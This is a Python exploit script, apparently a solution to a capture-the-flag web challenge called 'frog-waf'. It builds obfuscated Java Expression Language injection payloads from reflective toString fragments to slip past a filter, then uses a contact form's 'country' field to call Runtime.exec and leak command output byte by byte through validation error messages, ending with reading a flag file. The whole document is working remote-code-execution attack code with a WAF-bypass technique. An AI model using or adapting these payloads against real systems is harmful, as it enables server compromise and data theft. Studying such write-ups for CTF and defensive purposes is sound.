import itertools
import string

import requests

def get_int(i):
	return f"[{','.join(['null']*i)}].size()"

strs = {
	"[].iterator().toString()": "java.util.ArrayList$Itr@",
	"[].stream().toString()": "java.util.stream.ReferencePipeline$Head@",
	"[].size().getClass().toString()": "class java.lang.Integer",
	"[].toArray().toString()": "[Ljava.lang.Object;@",
	"(null==null).getClass().toString()": "class java.lang.Boolean"
}
chars = {}
for c in string.ascii_letters + ". ":
	poss = []
	for k, v in strs.items():
		if c in v:
			poss.append((k, "n", v.index(c)))
		elif c in v.lower():
			poss.append((k, "l", v.lower().index(c)))
		elif c in v.upper():
			poss.append((k, "u", v.upper().index(c)))
	if poss:
		chars[c] = min(poss, key=lambda x: x[2])

def get_char(c):
	if c in string.digits:
		return f'{get_int(int(c))}.toString()'
	s, case, offset = chars[c]
	case_method = {"n": "", "u": ".toUpperCase()", "l": ".toLowerCase()"}[case]
	return f"{s}.substring({get_int(offset)},{get_int(offset+1)}){case_method}"

def get_string(s):
	chrs = [get_char(c) for c in s]
	return chrs[0] + "".join(f".concat({c})" for c in chrs[1:])

# get the rest of the necessary chars from System.getProperty
# "/usr/local/openjdk-11"
chars['-'] = (
	f"[].getClass()[{get_string('forName')}]({get_string('java.lang.System')}).getMethods()[{get_int(2)}]"
	f".invoke(null, {get_string('java.home')})", "n", 18
)
# "unknown"
chars["w"] = (
	f"[].getClass()[{get_string('forName')}]({get_string('java.lang.System')}).getMethods()[{get_int(2)}]"
	f".invoke(null, {get_string('sun.os.patch.level')})", "n", 5
)
chars["k"] = (
	f"[].getClass()[{get_string('forName')}]({get_string('java.lang.System')}).getMethods()[{get_int(2)}]"
	f".invoke(null, {get_string('sun.os.patch.level')})", "n", 2
)
# "sun.awt.X11.XToolkit"
chars['x'] = (
	f"[].getClass()[{get_string('forName')}]({get_string('java.lang.System')}).getMethods()[{get_int(2)}]"
	f".invoke(null, {get_string('awt.toolkit')})", "l", 8
)

def run(payload):
	return requests.post(
		"http://frog-waf.chals.sekai.team/addContact",
		json={
		"description": "Process",
		"firstName": "Process",
		"lastName": "Process",
		"country": "${" + payload + "}"
		},
		timeout=1000
	).json()["violations"][0]["message"][:-len(' is not a valid country')]

def run_shell(s):
	p = (
		f"[].getClass()[{get_string('forName')}]({get_string('java.lang.Runtime')}).getMethods()[{get_int(6)}]"
		f".invoke(null).exec({get_string(s)})"
		".getInputStream().readAllBytes()"
	)
	x = ""
	for i in itertools.count():
		c = run(p + f"[{get_int(i)}]")
		try:
			x += chr(int(c))
			print(x)
		except ValueError:
			return x

#print(run_shell("ls"))
print(run_shell("cat flag-7662fe897b3335f35ff4c3c81b9e6371.txt"))
